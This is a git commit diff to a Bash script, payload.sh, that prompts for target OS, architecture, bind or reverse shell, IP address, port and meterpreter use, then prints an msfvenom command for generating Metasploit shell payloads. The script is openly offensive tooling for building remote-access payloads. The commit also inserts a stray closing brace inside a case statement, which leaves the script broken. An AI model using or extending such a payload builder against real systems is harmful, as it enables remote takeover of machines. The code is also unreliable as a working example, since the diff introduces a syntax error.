4d626bcaef318edd1aed5c380d83359714f6d0b9
root <root@localhost.localdomain>
2019-09-17 10:25:43 -0400

    windows x86 architecture not displayed

--- payload.sh
+++ payload.sh
@@ -7,15 +7,30 @@ read OS
 echo "Is it 64 bit or 32? Please type 32 or 64."
 read architecture
 
+
+no_arc_display(){
+case $OS in
+        windows)
+                arc=""
+        ;;
+esac
+}
+
+
 case $architecture in
 	32)
-		arc="x86"
+		arc="/x86"
+		no_arc_display
 	;;
 
 	64)
-		arc="x64"
+		arc="/x64"
+}
+
 	;;
 esac
+
+
 
 echo "Would you like to generate a bind shell or reverse shell? Please enter bind or reverse."
 read shell
@@ -27,8 +42,7 @@ case $shell in
         echo "Please enter the port you would like to listen on."
         read port
     ;;
-
- bind)
+  bind)
         echo "Please enter your target's IP address."
 	read ip
 	echo "Please enter the remote port."
@@ -36,8 +50,10 @@ case $shell in
     ;;
 esac
 
+
 echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
 read meterpreter
+
 
 echo "What would you like the file format to be? Example: exe, raw, pl, rb, c"
 read format
@@ -48,17 +64,14 @@ msfgen=""
 use_meterpreter() {
 case  $OS  in
         windows)
-                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
 		msfgen="$payload/${shell}_tcp"
         ;;
 
         linux)
-                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
                 msfgen="$payload/${shell}_tcp"
         ;;
 
         osx)
-                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
                 msfgen="$payload/${shell}_tcp"
         ;;
 
@@ -71,17 +84,14 @@ esac
 no_meterpreter() {
 case  $OS  in
         windows)
-                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
                 msfgen="$payload${shell}_tcp"
         ;;
 
         linux)
-                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
                 msfgen="$payload${shell}_tcp"
         ;;
 
         osx)
-                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
                 msfgen="$payload${shell}_tcp"
         ;;
         *)
@@ -91,17 +101,16 @@ esac
 
 case  $meterpreter  in
 	y)
-	echo "You are using meterpreter."
-	payload="$OS/meterpreter/$arc"
+	payload="$OS/meterpreter$arc"
 	use_meterpreter
-
+	echo "You will be creating a Meterpreter $shell shell payload for $architecture bit $OS in $format format."
         ;;
 	n)
-	echo "You are not using meterpreter."
-	payload="$OS/$arc/shell_"
+	payload="$OS$arc/shell_"
 	no_meterpreter
+	echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
         ;;
 	*)
 esac
 
-echo "msfvenom -p ${msfgen}"
+echo "msfvenom -p $msfgen"
